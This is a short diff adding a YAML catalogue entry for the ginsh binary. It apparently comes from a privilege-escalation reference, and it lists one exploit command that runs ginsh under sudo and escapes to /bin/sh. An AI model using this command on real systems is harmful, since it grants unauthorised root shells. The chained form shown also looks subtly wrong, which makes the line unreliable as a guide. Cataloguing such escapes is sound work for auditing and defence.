@@ -1,0 +1,4 @@
+name: ginsh
+binary_path: /usr/bin/ginsh
+exploit_cmds:
+- sudo /usr/bin/ginsh && !/bin/sh
